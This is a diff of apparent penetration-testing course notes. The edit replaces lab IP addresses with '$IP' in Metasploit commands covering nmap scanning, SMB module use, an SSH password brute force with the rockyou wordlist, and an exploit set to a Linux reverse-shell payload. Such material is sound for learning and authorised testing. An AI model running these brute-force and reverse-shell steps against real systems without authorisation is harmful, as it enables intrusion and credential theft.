@@ -35,7 +35,7 @@ show -h
 workspace
 
 # Create a new workspace
-workspace -a pen200
+workspace -a example_workspace
 ```
 
 ### Fundamentals
@@ -54,7 +54,7 @@ Command categories
 
 ```bash
 # Execute nmap within metasploit
-db_nmap -A 192.168.50.202
+db_nmap -A $IP
 
 # List discovered hosts
 hosts
@@ -73,7 +73,7 @@ search type:auxiliary smb
 use 56
 info
 show options
-set RHOSTS 192.168.40.202
+set RHOSTS $IP
 # OR set RHOSTs with database
 services -p 445 --rhosts
 run
@@ -85,7 +85,7 @@ use 15
 show options
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 set USERNAME george
-set RHOSTS 192.168.50.201
+set RHOSTS $IP
 set RPORT 2222
 run
 creds
@@ -104,7 +104,7 @@ set payload payload/linux/x64/shell_reverse_tcp
 show options
 set SSL false
 set RPORT 80
-set RHOSTS 192.168.50.16
+set RHOSTS $IP
 run
 # OR run as a job to require us to interact with the session before accessing it
 run -j
